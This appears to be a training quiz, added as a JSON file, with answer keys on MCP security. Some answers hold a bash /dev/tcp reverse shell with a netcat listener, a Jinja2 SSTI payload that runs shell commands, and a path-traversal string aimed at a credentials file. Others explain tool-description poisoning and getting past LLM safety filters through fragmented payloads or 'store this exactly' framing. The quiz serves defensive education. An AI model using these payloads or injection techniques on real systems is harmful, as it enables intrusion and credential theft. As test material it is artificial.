@@ -1,0 +1,1107 @@
+{
+  "slug": "module-09-exam",
+  "title": "Exam: MCP Security",
+  "type": "quiz",
+  "questions": [
+    {
+      "q": "What does MCP stand for, and what problem does it solve?",
+      "options": [
+        "Multi-Cloud Platform — a standard for distributing AI workloads across cloud providers",
+        "Model Context Protocol — a standard that lets an AI model safely connect to external tools and data sources, replacing custom integration code for each connection",
+        "Managed Compute Pool — a standard for allocating GPU resources to training jobs",
+        "Message Compression Protocol — a standard for reducing the size of API payloads"
+      ],
+      "answer": 1,
+      "explanation": "MCP standardizes how AI models connect to external tools and data, eliminating the need for custom glue code per integration."
+    },
+    {
+      "q": "What comparison is used to describe MCP's role for AI applications?",
+      "options": [
+        "A translation service between different human languages",
+        "A USB-C port, but for AI — one standard connector that works everywhere, regardless of the tool being connected",
+        "A vending machine that dispenses pre-built AI models",
+        "A traffic light system that controls the flow of API requests"
+      ],
+      "answer": 1,
+      "explanation": "Just as USB-C provides one standard connector for many devices, MCP provides one standard way for AI models to connect to any compatible tool."
+    },
+    {
+      "q": "Who released MCP, and when?",
+      "options": [
+        "OpenAI, in early 2023",
+        "Google, in mid-2022",
+        "Anthropic, in late 2024",
+        "Microsoft, in 2021"
+      ],
+      "answer": 2,
+      "explanation": "MCP is an open protocol released by Anthropic in late 2024."
+    },
+    {
+      "q": "What is the key security insight that runs throughout the entire MCP security domain?",
+      "options": [
+        "MCP gives the AI hands, and anything with hands can be tricked into doing real damage — an attacker who influences the AI inherits the AI's own tool permissions",
+        "MCP only affects text-based interactions and has no bearing on real-world actions",
+        "MCP eliminates all security risk by encrypting every message by default",
+        "MCP makes AI models fundamentally smarter and less prone to error"
+      ],
+      "answer": 0,
+      "explanation": "The core insight is that MCP expands what a compromised AI can actually do in the real world, since it gains real capabilities (hands) beyond just generating text."
+    },
+    {
+      "q": "What are the three core roles in MCP architecture?",
+      "options": [
+        "Host, Client, and Server",
+        "Frontend, Backend, and Database",
+        "Producer, Consumer, and Broker",
+        "Sender, Receiver, and Relay"
+      ],
+      "answer": 0,
+      "explanation": "The Host manages the interaction, the Client maintains a 1:1 connection to a Server, and the Server exposes the actual tools and data."
+    },
+    {
+      "q": "What is the relationship between a Client and a Server in MCP?",
+      "options": [
+        "A many-to-many relationship where any Client can connect to any Server freely",
+        "A strict 1:1 link — one Client always maps to exactly one Server",
+        "A 1:many relationship where one Client connects to multiple Servers simultaneously",
+        "Clients and Servers never directly connect; all communication goes through the Host only"
+      ],
+      "answer": 1,
+      "explanation": "Each Client is dedicated to exactly one Server connection — if a Host needs three servers, it creates three separate Clients."
+    },
+    {
+      "q": "What are the three capabilities an MCP Server can expose, and who controls each one?",
+      "options": [
+        "Keys (controlled by the admin), Certificates (controlled by the operator), and Tokens (controlled by the user)",
+        "Prompts (controlled by the user), Resources (controlled by the application, read-only), and Tools (controlled by the model, taking real actions)",
+        "Inputs (controlled by the server), Outputs (controlled by the client), and Logs (controlled by the host)",
+        "Views (controlled by the frontend), Models (controlled by the backend), and Controllers (controlled by the router)"
+      ],
+      "answer": 1,
+      "explanation": "Each capability type has a different controller, and this distinction is central to understanding MCP's risk profile — Tools are highest risk since the model itself decides when to invoke them."
+    },
+    {
+      "q": "Why are Tools considered the highest-risk MCP capability?",
+      "options": [
+        "The model itself decides to call them based on the conversation, and the model can be manipulated, meaning an attacker who influences the model's input effectively controls which tools run",
+        "Tools are exclusively used for read-only operations with no write access",
+        "Tools are the only capability type that can be listed using tools/list",
+        "Tools always require the most computing power of the three capability types"
+      ],
+      "answer": 0,
+      "explanation": "Since the model autonomously decides when to invoke a tool and the model's reasoning can be manipulated (e.g. via prompt injection), tools represent the highest-risk capability."
+    },
+    {
+      "q": "In the request flow, at what point does the Host inject tool descriptions into the model's context?",
+      "options": [
+        "After asking each Server for its list of available tools and resources, before sending the enriched prompt to the model",
+        "Tool descriptions are never actually sent to the model at all",
+        "Only after the model has already produced a final answer",
+        "Only when the user explicitly requests to see the tool descriptions"
+      ],
+      "answer": 0,
+      "explanation": "The Host retrieves tool lists from Servers and injects those descriptions directly into the model's context before the model even begins reasoning about the user's request."
+    },
+    {
+      "q": "Why is it accurate to say that every connection in the MCP architecture (Host-Server, model-tool, tool-result) represents a trust relationship that can potentially be broken?",
+      "options": [
+        "Because only the User-to-Host connection actually matters for security",
+        "Because MCP encrypts every message by default, making trust relationships irrelevant",
+        "Tool descriptions and tool results both enter the model's context, the Server runs with its own often-broader permissions, and the Host trusts the Server to describe itself honestly with no independent verification",
+        "Because MCP servers are always physically co-located with the Host on the same machine"
+      ],
+      "answer": 2,
+      "explanation": "Each connection in the architecture (Host-Server trust, model-tool trust, tool-result trust) represents an assumption that, if violated by an attacker, compromises the system."
+    },
+    {
+      "q": "What is the difference between a stdio transport and an HTTP/SSE transport for an MCP server?",
+      "options": [
+        "There is no functional difference between the two transport types",
+        "stdio runs entirely locally as a local process; HTTP/SSE reaches across the network to a remote server, which is often more valuable to attackers since it may connect to shared infrastructure",
+        "stdio is always encrypted while HTTP/SSE is always unencrypted",
+        "stdio only works on Windows while HTTP/SSE only works on Linux"
+      ],
+      "answer": 1,
+      "explanation": "stdio-based servers operate as local processes on the same machine, while HTTP/SSE servers communicate over the network, often exposing shared infrastructure that's more valuable to compromise."
+    },
+    {
+      "q": "A developer's MCP config reveals a filesystem server pointing to `/home/dev/projects` and a remote notes server at `http://tools.internal:8000/sse`. What does this configuration immediately tell an attacker performing recon?",
+      "options": [
+        "Nothing useful, since MCP configuration files are always encrypted at rest",
+        "That the developer's machine has no security vulnerabilities whatsoever",
+        "Only the total number of servers configured, with no information about their actual capabilities",
+        "Which paths are accessible via the filesystem server, and that the notes server expands the attack surface beyond the local machine to shared network infrastructure"
+      ],
+      "answer": 3,
+      "explanation": "The config directly reveals accessible file paths and network-reachable servers, giving an attacker a head start on mapping the full attack surface."
+    },
+    {
+      "q": "What do the MCP methods tools/list, resources/list, and prompts/list allow an attacker to do?",
+      "options": [
+        "Enumerate exactly what capabilities a server exposes, and any client with network access to the server can call these methods directly without needing the AI itself to cooperate",
+        "Automatically patch any known vulnerabilities in the connected servers",
+        "Delete all tools, resources, and prompts from a target server permanently",
+        "Encrypt the entire MCP configuration file for secure storage"
+      ],
+      "answer": 0,
+      "explanation": "These standard listing methods let anyone with network access directly enumerate a server's full capability set, without needing to go through the AI at all."
+    },
+    {
+      "q": "On a shared platform where an attacker only has chat access, how can they still enumerate the AI's available tools?",
+      "options": [
+        "By brute-forcing the AI's authentication token through repeated login attempts",
+        "By directly asking the AI to list every tool it has access to and describe what each one does — the AI often happily reveals its full capabilities",
+        "By exploiting a buffer overflow in the chat interface's rendering engine",
+        "This is impossible without direct network access to the underlying MCP servers"
+      ],
+      "answer": 1,
+      "explanation": "Simply asking the AI to describe its own capabilities is a surprisingly effective enumeration technique, since many systems don't restrict this kind of self-disclosure."
+    },
+    {
+      "q": "What is 'error-based schema extraction' as a recon technique?",
+      "options": [
+        "Deliberately crashing the entire MCP server to force a full system restart",
+        "A technique that only works against servers using the stdio transport",
+        "Sending a tool a deliberately wrong input and reading the resulting error message, which often leaks the exact expected parameters, data types, and internal structure",
+        "Encrypting error messages so only the attacker can decode their contents"
+      ],
+      "answer": 2,
+      "explanation": "This is directly analogous to SQL error-based enumeration in web pentesting — malformed input often triggers error messages that reveal internal implementation details."
+    },
+    {
+      "q": "Why does git history mining work even after a developer deletes a committed secret and 'fixes' the mistake?",
+      "options": [
+        "Git only permanently deletes secrets if they are explicitly flagged as sensitive",
+        "Deleted files in git are automatically restored after 30 days by default",
+        "Modern git versions encrypt deleted content, making it unrecoverable without a key",
+        "Git's entire purpose is to remember every change ever made — deleting a file is recorded as a new version, but the old version containing the secret stays in history forever"
+      ],
+      "answer": 3,
+      "explanation": "Version control systems are designed to preserve full history — a delete commit is just a new snapshot; the earlier commit containing the secret remains fully accessible."
+    },
+    {
+      "q": "How does a connected MCP git server make secret extraction from git history easier for an attacker?",
+      "options": [
+        "This scenario is not actually possible since MCP servers cannot execute git commands",
+        "The AI can run git commands directly through plain English requests, so an attacker never needs direct terminal access or command-line skill, and the activity blends in as normal developer activity",
+        "MCP git servers automatically decrypt any encrypted secrets found in the repository",
+        "MCP git servers can only read the latest commit and have no access to git history at all"
+      ],
+      "answer": 1,
+      "explanation": "A connected git server gives the AI legitimate repo access, letting an attacker mine history through natural language requests that look like normal developer activity in logs."
+    },
+    {
+      "q": "Why is a commit message like 'removed secrets' considered a strong signal to an attacker mining git history?",
+      "options": [
+        "Because commit messages of this type are always false and never actually contain real secrets",
+        "Such commit messages directly point an attacker to exactly which earlier commit contains the actual secret, making it trivial to locate and extract",
+        "Because git automatically flags any commit containing this phrase for review",
+        "Because this phrase is a technical git command that reveals hidden branches"
+      ],
+      "answer": 1,
+      "explanation": "Descriptive commit messages about removing secrets essentially tell an attacker exactly where to look — the commit immediately before it."
+    },
+    {
+      "q": "If a secret was already committed to a git repository and later removed, what is the recommended remediation?",
+      "options": [
+        "Simply delete the .git folder to permanently erase all history instantly",
+        "Rename the repository, since this automatically invalidates all previously exposed secrets",
+        "Wait 90 days before taking any action, since most attackers give up after that time",
+        "Rotate it immediately and assume it's already compromised — simply removing it from history is not sufficient on its own"
+      ],
+      "answer": 3,
+      "explanation": "Since a committed secret may have already been seen or copied by anyone with repo access, the only reliable fix is rotating the credential itself, not just removing it from history."
+    },
+    {
+      "q": "What is tool description poisoning?",
+      "options": [
+        "An attacker plants hidden instructions inside a tool's description field, which gets injected directly into the model's context but remains invisible to the user, who only sees the tool's name",
+        "A method for encrypting tool descriptions so only authorized users can read them",
+        "A technique for physically damaging the server hardware hosting an MCP tool",
+        "A defensive technique that automatically sanitizes malicious tool descriptions"
+      ],
+      "answer": 0,
+      "explanation": "Since the user never sees a tool's description field (only its name), it's a perfect hiding place for hidden instructions that the model will read and potentially obey."
+    },
+    {
+      "q": "A tool's advertised description reads 'Format source code according to the company style guide,' but the actual description field also contains a hidden line telling the model to silently embed any credentials it finds in a comment and never mention this behavior. Why does this attack work?",
+      "options": [
+        "Because the model always ignores any text following the word SYSTEM regardless of content",
+        "Because this type of attack has never actually succeeded against any real MCP deployment",
+        "Because tool descriptions are executed directly as code rather than being read by the model",
+        "The description enters the model's context as apparent trusted, system-level text, and the model treats it as legitimate guidance since the instruction even tells the model to hide its own behavior"
+      ],
+      "answer": 3,
+      "explanation": "The hidden instruction exploits the model's tendency to treat context-embedded text as legitimate guidance, and explicitly instructs the model to conceal the malicious behavior from the user."
+    },
+    {
+      "q": "What are the two flavors of tool description poisoning that a genuinely strong attack combines together?",
+      "options": [
+        "Encryption poisoning and compression poisoning",
+        "Frontend poisoning and backend poisoning",
+        "Instruction poisoning (hidden text manipulating model behavior) and exfiltration logic (the tool's actual code modified to steal data server-side)",
+        "Network poisoning and disk poisoning"
+      ],
+      "answer": 2,
+      "explanation": "Combining hidden instructions to manipulate the model with server-side code that independently exfiltrates data creates a redundant attack that works even if the model's behavior looks normal."
+    },
+    {
+      "q": "Which of these is listed as a concrete detection signal for tool description poisoning?",
+      "options": [
+        "A description's length suddenly jumping, for example from 55 to 380 characters",
+        "A tool being called more than once in a single conversation",
+        "A tool that has been in production for more than six months",
+        "A tool description written entirely in lowercase letters"
+      ],
+      "answer": 0,
+      "explanation": "A sudden, unexplained jump in description length is a strong signal that hidden text has been added, since legitimate description updates rarely produce such dramatic size changes."
+    },
+    {
+      "q": "Why is tool description poisoning often described as fundamentally a supply chain attack?",
+      "options": [
+        "Because tool description poisoning only affects servers that import external Python packages",
+        "Because this attack requires physical access to a supply warehouse",
+        "A poisoned shared MCP server (via a malicious pull request, untrusted third-party install, or stolen token) affects every single user who connects to it once deployed",
+        "Because tool descriptions can only be poisoned during the initial hardware manufacturing process"
+      ],
+      "answer": 2,
+      "explanation": "Once a shared server is compromised upstream, the poison spreads to every downstream user who connects, exactly matching the pattern of a supply chain attack."
+    },
+    {
+      "q": "What are MCP Apps, and what makes them a genuine phishing risk?",
+      "options": [
+        "A separate mobile application unrelated to the main MCP protocol",
+        "Tools that can return interactive HTML rendered inside a sandboxed iframe in the chat window — since there's no URL bar, no sender address, and the user themselves initiated the interaction, a fake login box feels completely legitimate",
+        "A feature that lets users download and install native desktop applications",
+        "A tool exclusively used for displaying static, non-interactive images"
+      ],
+      "answer": 1,
+      "explanation": "Unlike traditional phishing which has visible red flags (suspicious URLs, unknown senders), MCP App phishing appears inside a trust context the user already relies on, with none of those usual warning signs."
+    },
+    {
+      "q": "How does a stolen credential from a fake login page inside an MCP App actually escape the sandboxed iframe?",
+      "options": [
+        "The data is physically written to a file that the attacker later retrieves in person",
+        "Through postMessage and the AppBridge, by abusing a legitimate, already-approved tool (such as save_snippet) and passing the stolen data as the tool's normal argument content",
+        "The iframe automatically has full, unrestricted network access to send data anywhere directly",
+        "This is impossible; sandboxed iframes can never transmit any data outside themselves"
+      ],
+      "answer": 1,
+      "explanation": "Since the fake page is sandboxed, it can't make direct network requests — but abusing the postMessage/AppBridge channel to call a legitimate tool with stolen data disguised as normal arguments accomplishes the same result."
+    },
+    {
+      "q": "Why does the MCP App UI phishing attack not trigger a new tool approval prompt?",
+      "options": [
+        "The UI tool (such as a timer) was already approved beforehand — the attacker only changed what HTML that already-trusted tool returns, a fully server-side swap invisible to the user",
+        "The attacker must obtain a new approval for every single interaction, making this attack impractical",
+        "MCP Apps are exempt from all approval requirements by design specification",
+        "Approval prompts only apply to tools that access the filesystem, never to UI-rendering tools"
+      ],
+      "answer": 0,
+      "explanation": "Since the tool itself was already approved and only its returned content changed server-side, the user sees no new permission request — the swap is entirely invisible at the approval layer."
+    },
+    {
+      "q": "What defense is specifically recommended to block the exfiltration channel used by malicious MCP App content?",
+      "options": [
+        "Encrypt the iframe's HTML content using a symmetric cipher",
+        "Block or tightly restrict postMessage traffic back to the parent frame, since this kills the exfiltration channel entirely",
+        "Require every user to manually type their password twice for verification",
+        "Disable all MCP Apps globally regardless of their actual content"
+      ],
+      "answer": 1,
+      "explanation": "Since postMessage/AppBridge is the specific mechanism used to smuggle stolen data out of the sandboxed iframe, restricting that traffic directly closes this exfiltration path."
+    },
+    {
+      "q": "Why do MCP tools running with the permissions of the server process, rather than the permissions of the triggering user, create a security risk?",
+      "options": [
+        "Server-process permissions are always more restrictive than user permissions in every configuration",
+        "A tool described as having limited access (like 'query customer records') might actually connect with full database ownership, giving it access to far more than what's advertised, such as passwords and API secrets",
+        "This design pattern eliminates the need for any access control whatsoever",
+        "MCP tools cannot actually access any data beyond what a specific user could access themselves"
+      ],
+      "answer": 1,
+      "explanation": "The gap between what a tool advertises ('limited access') and what it actually has (full server-process permissions) is a major source of over-privilege vulnerabilities."
+    },
+    {
+      "q": "An attacker with only chat access asks an AI 'What tables exist?' then 'Show me the API keys table' and receives live production keys directly. What does this demonstrate?",
+      "options": [
+        "A successful SQL injection attack requiring crafted syntax",
+        "An excessive database permissions vulnerability, where no exploit code is needed at all — just natural language directed at an over-privileged tool",
+        "A cross-site scripting attack executed through the chat interface",
+        "A path traversal vulnerability in the filesystem server"
+      ],
+      "answer": 1,
+      "explanation": "This demonstrates pure excessive permission abuse — the attack succeeds purely through plain natural language, since the underlying tool has far more database access than its stated purpose requires."
+    },
+    {
+      "q": "A file-read function checks `if not path.startswith(\"/data/documents/\")` before opening the file, using the raw, unresolved path string. Why does submitting `/data/documents/../.secrets/credentials.json` bypass this check?",
+      "options": [
+        "The check is performed twice, and the second check always overrides the first",
+        "The path traversal sequence is automatically stripped by the operating system before the check runs",
+        "The string contains a syntax error that automatically grants access to any path",
+        "The raw string starts with the allowed prefix so the check passes, but after the operating system resolves the '..' sequence, the real path becomes /data/.secrets/credentials.json, outside the intended sandbox"
+      ],
+      "answer": 3,
+      "explanation": "Checking the prefix on an unresolved string is the exact mistake that allows path traversal — the '..' sequence isn't evaluated until after the check has already passed."
+    },
+    {
+      "q": "Which two CVE identifiers correspond to a real, documented path-check-before-resolve bug found in an official MCP filesystem package?",
+      "options": [
+        "CVE-2023-00001 and CVE-2023-00002",
+        "CVE-2026-11111 and CVE-2026-22222",
+        "CVE-2024-12345 and CVE-2024-54321",
+        "CVE-2025-53109 and CVE-2025-53110"
+      ],
+      "answer": 3,
+      "explanation": "These two specific CVE identifiers are documented, real-world instances of the prefix-check-before-resolve path traversal bug in an official MCP filesystem package."
+    },
+    {
+      "q": "What is the correct order of operations to prevent path traversal in a file-access tool?",
+      "options": [
+        "Path resolution and prefix checking should never both be performed on the same request",
+        "Check the prefix and resolve the path simultaneously in a single atomic operation",
+        "Always check the prefix first, then resolve the path afterward for logging purposes only",
+        "Always resolve (normalize) the path first, and only then check the prefix against the resolved result"
+      ],
+      "answer": 3,
+      "explanation": "The fix requires resolving the path to its final, canonical form before any prefix validation occurs, closing the gap that unresolved-string checks leave open."
+    },
+    {
+      "q": "What is the difference between `os.path.normpath` and `os.path.realpath`, and why does this matter for symlink-based sandbox escapes?",
+      "options": [
+        "Neither function has any relationship to symlink resolution or path validation",
+        "normpath follows symlinks while realpath only cleans up text formatting",
+        "normpath and realpath are functionally identical and can be used interchangeably",
+        "normpath only cleans up path text (handling '../') without following symlinks; realpath follows every symlink to the true physical file, so a symlinked folder pointing outside the sandbox is caught only by realpath"
+      ],
+      "answer": 3,
+      "explanation": "Since normpath is purely cosmetic text cleanup and doesn't resolve symlinks, a symlink pointing to a sensitive location would still pass a normpath-based check, while realpath correctly follows it to reveal the true, unauthorized destination."
+    },
+    {
+      "q": "What is the core problem tool chaining exploits, when the output of one MCP tool becomes the input to another?",
+      "options": [
+        "Tool chaining only affects tools written in compiled languages, never interpreted ones",
+        "Data moving between internal tools is always automatically re-validated at every single step",
+        "Input validation usually happens right at the entry point, but when data moves between internal tools, that validation is often skipped entirely, since each tool simply trusts the one before it",
+        "Tool chaining is purely theoretical and has never actually been demonstrated in a real system"
+      ],
+      "answer": 2,
+      "explanation": "The assembly-line analogy captures this exactly — each individual tool may function correctly on its own, but data passed between tools often skips the validation each tool would apply to direct user input."
+    },
+    {
+      "q": "What is Server-Side Template Injection (SSTI)?",
+      "options": [
+        "A technique for compressing template files to reduce their storage size",
+        "A vulnerability where a template engine evaluates code found inside placeholders instead of treating that content as plain, inert text, letting an attacker smuggle real code through the placeholder",
+        "A method for automatically generating templates from a database schema",
+        "A vulnerability that only affects client-side JavaScript template rendering"
+      ],
+      "answer": 1,
+      "explanation": "SSTI occurs when a template engine's evaluation behavior processes untrusted data as executable expressions rather than literal text."
+    },
+    {
+      "q": "Why does asking an AI to render `{{ 7*7 }}` fail as a genuine test for SSTI when the payload passes through an LLM before reaching the template engine?",
+      "options": [
+        "Template engines cannot process any mathematical expressions whatsoever",
+        "The AI itself computes 49 on its own and simply passes that number along, meaning the template engine never actually sees the original expression at all",
+        "The AI always refuses to process arithmetic expressions for safety reasons",
+        "The number 49 is a reserved keyword that all template engines automatically block"
+      ],
+      "answer": 1,
+      "explanation": "Since the LLM computes the arithmetic itself before passing the result along, the raw '{{ 7*7 }}' expression never actually reaches the vulnerable template engine, making it an unreliable test in this context."
+    },
+    {
+      "q": "Why does storing `{{ lipsum.__globals__.keys() }}` work as a genuine SSTI confirmation test, when `{{ 7*7 }}` does not?",
+      "options": [
+        "The AI cannot compute lipsum.__globals__.keys() itself since it's a server-specific runtime object, so the expression survives verbatim until it reaches the actual vulnerable template engine",
+        "Because this expression is shorter and therefore less likely to trigger a safety filter",
+        "Because lipsum is a reserved word that all AI models automatically refuse to process",
+        "Because __globals__ is a standard Python keyword recognized by every LLM as safe"
+      ],
+      "answer": 0,
+      "explanation": "Since the lipsum.__globals__ object only exists within the server's actual Jinja2 runtime, the AI has no way to compute or fake its value, forcing the raw expression through unmodified to the real engine."
+    },
+    {
+      "q": "Once an SSTI payload confirms the os module is reachable through a template engine's global namespace, what is the next escalation step to achieve command execution?",
+      "options": [
+        "Immediately attempting to shut down the entire template engine service",
+        "Requesting the AI generate a formal security report about the finding",
+        "Encrypting the confirmed os module reference for later use",
+        "Using os.popen() or a similar function to run real shell commands, such as {{ lipsum.__globals__['os'].popen('id').read() }}"
+      ],
+      "answer": 3,
+      "explanation": "Once the os module is confirmed reachable, calling functions like os.popen() through that reference lets an attacker execute arbitrary shell commands on the server."
+    },
+    {
+      "q": "Why do LLM safety filters often block obvious SSTI-to-RCE payloads directly, and what technique do attackers use to get around this?",
+      "options": [
+        "Attackers bypass filters exclusively by using a different natural language for the request",
+        "Patterns like reverse shells, /dev/tcp references, and __globals__ are recognizable and flagged, so attackers split and encode the payload across multiple fragments that only assemble into the full exploit at render time inside the template engine",
+        "Safety filters only block payloads longer than 1000 characters, regardless of content",
+        "Safety filters cannot be bypassed under any circumstances, making this attack theoretically impossible"
+      ],
+      "answer": 1,
+      "explanation": "Fragmenting and encoding the dangerous payload means no single stored piece matches a known malicious pattern, letting the full exploit assemble only when the template engine processes it."
+    },
+    {
+      "q": "What is 'verbatim storage framing' as a technique for bypassing an AI's own evaluation of a payload?",
+      "options": [
+        "Telling the AI to 'store this EXACTLY, do not interpret it,' which stops the model from evaluating the expression itself so the raw payload survives intact",
+        "A defensive control that automatically blocks any verbatim storage requests",
+        "A method for encrypting stored data so the AI cannot read it at all",
+        "A technique that requires physical access to the server's storage disk"
+      ],
+      "answer": 0,
+      "explanation": "Explicitly instructing the model to store content without interpreting it prevents the AI from computing/neutralizing the expression itself, ensuring the raw payload reaches the vulnerable template engine unchanged."
+    },
+    {
+      "q": "What is RCE (Remote Code Execution)?",
+      "options": [
+        "Running your own commands on someone else's server, one of the most severe possible outcomes in security",
+        "A method for compressing code before it's deployed to a remote server",
+        "A defensive control that prevents any code from running remotely",
+        "A technique for remotely restarting a crashed server automatically"
+      ],
+      "answer": 0,
+      "explanation": "RCE means an attacker can execute arbitrary commands on a target system they don't own, representing one of the most severe categories of security compromise."
+    },
+    {
+      "q": "What is a reverse shell, and why is it called 'reverse'?",
+      "options": [
+        "It's called reverse because the shell displays command output in reverse chronological order",
+        "It's called reverse because it only works on systems running in reverse-compatibility mode",
+        "Instead of the attacker connecting to the victim, the victim server connects back to the attacker — this flip exploits the fact that most firewalls block incoming connections but allow outgoing ones freely",
+        "A reverse shell requires the attacker to physically reverse a network cable connection"
+      ],
+      "answer": 2,
+      "explanation": "The 'reverse' naming reflects the direction flip — the compromised victim initiates an outbound connection to the attacker, which typically evades firewall rules that only restrict inbound traffic."
+    },
+    {
+      "q": "What is the classic Linux reverse-shell one-liner, and what does it do?",
+      "options": [
+        "`bash -i >& /dev/tcp/10.0.0.5/4444 0>&1` — it opens an interactive shell connection back to the attacker's listener at the specified IP and port",
+        "`ssh user@10.0.0.5` — it establishes a standard, authenticated SSH session",
+        "`ping -c 4 10.0.0.5` — it tests basic network connectivity to a remote host",
+        "`curl http://10.0.0.5/download` — it downloads a file from a remote server"
+      ],
+      "answer": 0,
+      "explanation": "This command redirects an interactive bash session over a TCP connection to the attacker's IP and port, establishing a live, interactive reverse shell."
+    },
+    {
+      "q": "Why does an attacker start a listener with `nc -lvnp 4444` before triggering a reverse shell payload?",
+      "options": [
+        "The listener waits on a specific port for the victim's outbound connection to arrive, which is what actually establishes the interactive shell session",
+        "This command is used to scan the victim's network for other vulnerable hosts",
+        "This command encrypts all future communication between attacker and victim",
+        "This command permanently deletes all logs on the attacker's own machine"
+      ],
+      "answer": 0,
+      "explanation": "The listener (netcat in this case) must be actively waiting for the incoming connection from the victim's reverse shell payload in order to catch and establish the session."
+    },
+    {
+      "q": "What is the recommended defensive control that directly blocks reverse shells from succeeding, even if SSTI/RCE is achieved?",
+      "options": [
+        "Requiring a CAPTCHA before any template rendering occurs",
+        "Network egress filtering, so the compromised server can't make arbitrary outbound connections on its own",
+        "Increasing the model's temperature setting to reduce payload reliability",
+        "Disabling all inbound network traffic to the server entirely"
+      ],
+      "answer": 1,
+      "explanation": "Since a reverse shell fundamentally requires the victim server to make an outbound connection, restricting what outbound connections are permitted (egress filtering) directly prevents this technique from working."
+    },
+    {
+      "q": "What core defensive philosophy addresses the fact that every MCP attack exploits a broken trust relationship somewhere (LLM trusts tools, tools trust inputs, user trusts LLM)?",
+      "options": [
+        "MCP systems are inherently trustworthy once TLS encryption has been enabled",
+        "Real defense means verifying trust at every single link, instead of assuming it holds",
+        "Trust should be granted by default to any component that has been in production for more than 30 days",
+        "Trust verification is only necessary for servers accessed by more than 100 users"
+      ],
+      "answer": 1,
+      "explanation": "Since every attack ultimately breaks some assumed trust relationship, defense requires actively verifying (not assuming) trust at each link in the chain."
+    },
+    {
+      "q": "Why should data coming from another MCP tool still be treated as untrusted input, even though it originates internally rather than directly from a user?",
+      "options": [
+        "Tool-to-tool data is inherently safer than user input since it doesn't come directly from an external source",
+        "This principle only applies to servers using the HTTP transport, never stdio",
+        "Data from another tool is always automatically pre-validated by the MCP protocol itself",
+        "Tool chaining attacks succeed precisely because teams tend to forget this point — data crossing tool boundaries needs the same validation as direct user input"
+      ],
+      "answer": 3,
+      "explanation": "This is a critical rule — forgetting that inter-tool data is still untrusted is exactly the gap that enables tool chaining attacks like SSTI."
+    },
+    {
+      "q": "Why should the LLM never be allowed to enforce authorization entirely on its own?",
+      "options": [
+        "LLMs are technically incapable of processing any authorization-related logic",
+        "LLM-based authorization is always faster than code-based authorization, making it undesirable",
+        "If the AI decides who's allowed to do what, an attacker just has to say 'I am an admin' to bypass it — permissions must be enforced in code tied to the real authenticated user",
+        "This restriction only applies to servers running on cloud infrastructure"
+      ],
+      "answer": 2,
+      "explanation": "Since the model can be persuaded by claimed authority (a classic prompt injection technique), real authorization must be enforced in code against the actual authenticated identity, not left to the model's judgment."
+    },
+    {
+      "q": "What defense specifically helps block DNS rebinding attacks against MCP HTTP servers?",
+      "options": [
+        "Checking the Origin header on HTTP servers",
+        "Disabling all TLS encryption to simplify header inspection",
+        "Increasing the server's maximum concurrent connection limit",
+        "Running the server exclusively on a non-standard, obscure port number"
+      ],
+      "answer": 0,
+      "explanation": "Verifying the Origin header helps confirm requests are actually coming from an expected source, which is a key defense against DNS rebinding attacks targeting local or internal servers."
+    },
+    {
+      "q": "Which detection signal from the defenses summary table specifically points to a possible UI phishing chain?",
+      "options": [
+        "A tool call that completes in under 100 milliseconds",
+        "A user logging in from the same IP address twice within one hour",
+        "A formatting request that also triggers a UI tool, which is genuinely suspicious given the mismatch between the requested action and the tool actually invoked",
+        "A server restarting after a routine scheduled maintenance window"
+      ],
+      "answer": 2,
+      "explanation": "An unexpected tool invocation that doesn't logically match the user's actual request (like a simple formatting task also triggering an unrelated UI tool) is a specific behavioral anomaly signaling a possible hidden-instruction-driven attack."
+    },
+    {
+      "q": "In the best practices checklist for MCP Server developers, what design principle is recommended regarding tool scope?",
+      "options": [
+        "One tool, one job — small, focused tools are genuinely easier to secure and reason about",
+        "Each tool should handle as many different tasks as possible to reduce total tool count",
+        "Tools should always be designed to have the broadest possible database access by default",
+        "Tool scope should be determined dynamically by the model at runtime, not fixed in code"
+      ],
+      "answer": 0,
+      "explanation": "Keeping each tool narrowly focused on a single job makes its security properties easier to reason about and reduces the potential blast radius of any single tool being compromised."
+    },
+    {
+      "q": "In the well-secured MCP tool example (`read_doc`), what is the correct order of operations demonstrated in the code?",
+      "options": [
+        "Read the file first, then check afterward whether the path was actually allowed",
+        "Check the file's contents for malicious code before checking whether the path itself is valid",
+        "Resolve symlinks and '..' first using realpath, then verify the result stays inside the sandbox before reading the file",
+        "Verify the sandbox boundary first using the raw unresolved path, then resolve symlinks afterward"
+      ],
+      "answer": 2,
+      "explanation": "The secure example explicitly resolves the path with realpath first, then checks that the resolved result stays within the safe root — exactly the resolve-then-check pattern that prevents path traversal."
+    },
+    {
+      "q": "What is the golden rule stated specifically for MCP users regarding secrets?",
+      "options": [
+        "Users should always store their passwords directly in the AI's system prompt for convenience",
+        "Secrets are automatically safe to share as long as the connection uses HTTPS",
+        "Never share secrets, such as passwords or API keys, with an AI that has MCP tools connected to it, since a poisoned or malicious server may exfiltrate anything the model happens to see",
+        "Sharing secrets with an AI assistant is only risky if the assistant lacks any MCP tools"
+      ],
+      "answer": 2,
+      "explanation": "Since any tool the AI has access to could potentially be compromised (via description poisoning, supply chain attacks, etc.), sharing secrets with an MCP-connected AI creates real exfiltration risk."
+    },
+    {
+      "q": "What are five core principles that together form a strong overall mindset for MCP security?",
+      "options": [
+        "Optimize for speed, optimize for cost, optimize for uptime, optimize for scale, and optimize for simplicity",
+        "Encrypt everything, compress everything, log everything, cache everything, and back up everything",
+        "Trust all internal traffic, restrict all external traffic, patch quarterly, audit annually, and train new hires",
+        "Assume every input is hostile, grant the least access possible, verify trust actively, watch for anomalies, and contain damage before it spreads"
+      ],
+      "answer": 3,
+      "explanation": "These five principles — hostile-by-default assumption, least privilege, active trust verification, anomaly monitoring, and damage containment — summarize the overall defensive mindset for MCP security."
+    },
+    {
+      "q": "A recon-focused attacker examines an MCP config file and identifies three servers: a stdio filesystem server scoped to one folder, a stdio git server, and a remote SSE-based notes server. Which server most likely represents the highest-value target, and why?",
+      "options": [
+        "The remote notes server, since remote (SSE/HTTP) servers tend to reach shared infrastructure and other downstream systems beyond the local machine, unlike stdio servers confined to the local process",
+        "The filesystem server, since local file access is always considered higher value than any network-reachable resource",
+        "All three servers carry identical risk levels regardless of their transport mechanism",
+        "The git server, since git servers are always more valuable than any other server type regardless of scope"
+      ],
+      "answer": 0,
+      "explanation": "Since the remote notes server reaches across the network to shared infrastructure, compromising it potentially affects more systems and users than a purely local stdio-based server."
+    },
+    {
+      "q": "An MCP server exposes a tool described as 'query_customer_orders,' but the underlying database connection uses a superuser role with full read/write access to every table. An attacker with only chat access asks the AI to describe the database schema and then dump the contents of an api_keys table. What is the most direct fix for this specific vulnerability?",
